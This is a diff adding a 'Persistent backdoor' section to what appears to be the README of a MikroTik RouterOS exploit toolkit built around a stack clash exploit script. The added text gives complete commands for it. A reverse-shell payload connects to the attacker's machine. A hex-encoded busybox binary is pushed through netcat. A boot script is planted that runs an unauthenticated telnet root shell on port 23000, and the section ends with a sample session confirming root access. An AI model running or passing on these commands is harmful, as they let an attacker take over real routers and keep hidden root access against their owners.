@@ -91,6 +91,29 @@ $ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/teln
 and wait until the connection automatically close.  
 (Once the file is uploaded, run again reverse shell (this time only listening with `nc -l -p 1234`) and you will find busybox inside `/ram/`)
 
+### Persistent backdoor
+Enable persistent telnet server on port 23000 
+In a shell:
+```
+$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips 
+$ { echo "echo Installing backdoor..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /flash/bin/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; echo "chmod 777 /flash/bin/busybox"; echo "/flash/bin/busybox --install -s /flash/bin/"; echo "mkdir -p /flash/etc/rc.d/run.d"; echo 'echo -e "#!/bin/bash\ntelnetd -p 23000 -l sh" > /flash/etc/rc.d/run.d/S89own'; echo "chmod 777 /flash/etc/rc.d/run.d/S89own"; echo "/nova/bin/info '/system reboot'"; echo "echo Done! Rebooting..."; } | nc -l -p 1234
+```
+In another shell (note that this is the reverse shell command):
+```
+$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"
+```
+and wait until `Done! Rebooting...` appears.  
+Once the router is up:
+```
+$ telnet 192.168.8.1 23000
+Trying 192.168.8.1...
+Connected to 192.168.8.1.
+Escape character is '^]'.
+
+
+MikroTik v6.38.4 (stable)
+/ #
+```
 # FAQ
 #### Where does one get the chimay-red.py file, that this tool kit relies on?  
 This is a reverse engineering of leaked CIA documentation.  
